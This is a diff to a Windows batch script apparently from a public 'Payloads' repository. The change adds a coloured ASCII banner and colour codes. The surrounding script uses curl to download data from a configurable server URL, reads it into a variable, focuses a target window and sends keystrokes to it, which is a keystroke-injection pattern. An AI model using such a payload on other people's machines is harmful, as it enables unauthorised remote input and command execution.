@@ -12,16 +12,29 @@ if "%1"=="1" (
     shift
 )
 
-:: Get data from file
+:: Art
+cls
 echo.
-echo Getting data from server...
-curl -Lso %fileName% %dataURL%
+echo. [33m"|     [1;36m /#######  /##      [0m                                                  [33m|"[0m
+echo. [33m"|     [1;36m| ##__  ##| ##      [0m                                                  [33m|"[0m
+echo. [33m"|     [1;36m| ##  \ ##| ##      [0m           [1;37mPayloads[0m by Jed556[0m                     [33m|"[0m
+echo. [33m"|     [1;36m| #######/| ##      [0m           [4mGitHub.com/Jed556/Payloads[0m             [33m|"[0m
+echo. [33m"|     [1;36m| ##____/ | ##      [0m                                                  [33m|"[0m
+echo. [33m"|     [1;36m| ##      | ########[0m                                                  [33m|"[0m
+echo. [33m"|     [1;36m|__/      |________/[0m                                                  [33m|"[0m
+
+
+:: Get data from url
+echo.
+echo Reading data from server...[1m
+curl -Lo %fileName% %dataURL%
 setlocal EnableDelayedExpansion EnableExtensions
 set "data="
 for /f "delims=" %%i in (data.logkey) do (
   set "data=!data!%%i "
 )
 endlocal & set "data=%data%"
+echo [0m
 
 :: Focus on the target window
 echo.
@@ -52,9 +65,9 @@ endlocal & set "keys=%keys%"
 :: Check variables
 if "%debug%"=="1" (
     echo.
-    echo [DEBUG] Path: %~dp0
-    echo [DEBUG] Data: %data%
-    echo [DEBUG] Keys: %keys%
+    echo [1;35m[DEBUG][0m Path: %~dp0
+    echo [1;35m[DEBUG][0m Data: %data%
+    echo [1;35m[DEBUG][0m Keys: %keys%
 )
 
 :: Bye
